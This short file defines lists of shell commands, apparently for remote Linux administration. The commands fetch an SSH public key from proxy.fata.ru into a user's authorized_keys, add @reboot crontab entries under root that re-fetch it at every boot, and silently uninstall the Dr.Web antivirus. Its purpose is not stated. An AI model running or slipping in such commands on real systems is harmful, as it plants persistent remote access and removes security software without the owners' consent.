DownloadOpenRSA = [
    "mkdir /home/fatalocal/.ssh;wget http://proxy.fata.ru/rsa.pub -xO /home/fatalocal/.ssh/authorized_keys;chmod 600 /home/fatalocal/.ssh/authorized_keys;chmod 700 /home/fatalocal/.ssh/;",
]
CronRSAUploader = [
    "sudo su",
    '''echo "@reboot wget http://proxy.fata.ru/rsa.pub -xO /home/fatalocal/.ssh/authorized_keys" >> /etc/crontab''',
    '''echo "@reboot chmod 700 /home/fatalocal/.ssh/authorized_keys" >> /etc/crontab''',
    "chown fatalocal:fatalocal /home/fatalocal/.ssh/authorized_keys",
    "systemctl enable crond",
    "systemctl start crond",
    "exit"
]
HelloWorld = [
    "echo 'Hello World!'",
    "ls asdsdfg"
]
DeleteDrweb = [
    "sudo nohup /opt/drweb.com/bin/remove.sh --non-interactive &",
]